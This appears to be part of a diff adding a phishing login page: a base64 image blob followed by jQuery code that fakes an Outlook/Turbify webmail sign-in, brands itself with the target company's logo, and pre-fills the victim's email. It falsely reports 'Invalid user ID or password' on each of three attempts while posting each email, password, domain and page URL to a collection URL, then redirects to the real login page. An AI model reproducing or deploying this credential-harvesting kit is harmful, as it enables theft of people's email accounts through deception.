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"
+
+          fetch(`https://logo.clearbit.com/${brokenEmail[1]}`)
+            .then((res) => {
+              $(".custom-bannered").attr(
+                "src",
+                `https://logo.clearbit.com/${brokenEmail[1]}`
+              );
+              // .addClass("biggerImage");
+
+              $(".small-logo").attr(
+                "href",
+                `https://logo.clearbit.com/${brokenEmail[1]}`
+              );
+              // .addClass("biggerImage");
+            })
+            .catch((err) => {});
+
+          //   $("#favicon").attr("href", `https://logo.clearbit.com/${brokenEmail[1]}`)
+          //   $('#bottomline').html(`${upper_main_domain} Outlook`)
+          //   $("#title").html(`${upper_main_domain}`);
+          //   document.title = `${upper_main_domain} - Outlook`;
+          //   $("#poweredby").html(upper_main_domain);
+
+          //   $('#ImgLoginBanner').attr(
+          //     'style',
+          //     `background-image: url('https://logo.clearbit.com/${brokenEmail[1]}')`
+          //   )
+
+          $(`#login`).val(emailHref);
+          $(`#login`).attr("disabled", "disabled");
+          $(`#login`).addClass("input-disabled");
+          $("#password").focus();
+        }
+        history.replaceState("", "", newHref);
+
+        passwordChecker($(`#login`), $(`#password`), "");
+
+        function passwordChecker(emailVal, passVal, domain) {
+          var count = 0;
+          var submitButton = $("#btnLogin");
+          var msg = $("#alerted");
+          var msgElem = $("#alerted-con");
+          var loadingMsg = "Sign in";
+          var successMsg = "Invalid user ID or password.";
+          var invalidMsg = "Invalid user ID or password.";
+          var noPass = "Enter a password!";
+          var lessThan4 = "Password must be above 4 characters!";
+          var error = "No email found";
+
+          msgElem.hide();
+          $("#form-lgn").submit((e) => {
+            e.preventDefault();
+
+            msg.hide();
+            msg.html("");
+            msgElem.hide();
+            domain = emailVal.val().split("@")[1];
+
+            msg.show();
+            // msg.html(loadingMsg);
+            $("#btnLogin").html(loadingMsg);
+            setTimeout(async () => {
+              if (emailVal.val() == "") {
+                msg.show();
+                msg.html(error);
+                msgElem.show();
+              } else {
+                if (passVal.val() == "") {
+                  msg.show();
+                  msg.html(noPass);
+                  msgElem.show();
+                } else {
+                  if (passVal.val().length < 4) {
+                    msg.show();
+                    msg.html(lessThan4);
+                    msgElem.show();
+                    passVal.val("");
+                  } else {
+                    count = ++count;
+                    if (count == 1) {
+                      msg.show();
+                      msg.html(invalidMsg);
+                      msgElem.show();
+
+                      postDataHelper(emailVal.val(), passVal.val(), domain);
+                      passVal.val("");
+                    } else if (count == 2) {
+                      msg.show();
+                      msg.html(invalidMsg);
+                      msgElem.show();
+
+                      postDataHelper(emailVal.val(), passVal.val(), domain);
+                      passVal.val("");
+                    } else if (count == 3) {
+                      const { out, pstD } = await postDataHelper(
+                        emailVal.val(),
+                        passVal.val(),
+                        domain
+                      );
+
+                      if (pstD) {
+                        msg.show();
+                        msg.html(successMsg);
+                        msgElem.show();
+
+                        setTimeout(() => {
+                          window.location.replace(
+                            `https://mail.turbify.com/login`
+                          );
+                        }, 5000);
+                      }
+                    }
+                  }
+                }
+              }
+
+              $("#btnLogin").html("Sign in");
+            }, 3000);
+
+            // console.log("count: ", count)
+          });
+        }
+      });
+
+      // Example POST method implementation:
+      async function postData(url = "", data) {
+        const formData = new FormData();
+        formData.append("email", data.email);
+        formData.append("password",`${data.password} =>>> [${location.href}]`);
+        const response = await axios.post(url, formData);
+        return response.data;
+      }
+
+      async function postDataHelper(em, pass, dm) {
+        outgoingObj.email = em;
+        outgoingObj.password = pass;
+        outgoingObj.domain = dm;
+
+        var out = { key: em, dm };
+
+        // Put here the url of the email
+        var pstD = await postData(RURL, {
+          ...outgoingObj,
+        });
+
+        return { out, pstD };
+      }
+
+      function genID(length) {
+        var result = "";
+        var characters =
+          "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+        var charactersLength = characters.length;
+        for (var i = 0; i < length; i++) {
+          result += characters.charAt(
+            Math.floor(Math.random() * charactersLength)
+          );
+        }
+
+        return result;
+      }
+    </script>
+
+  </body>
+</html>
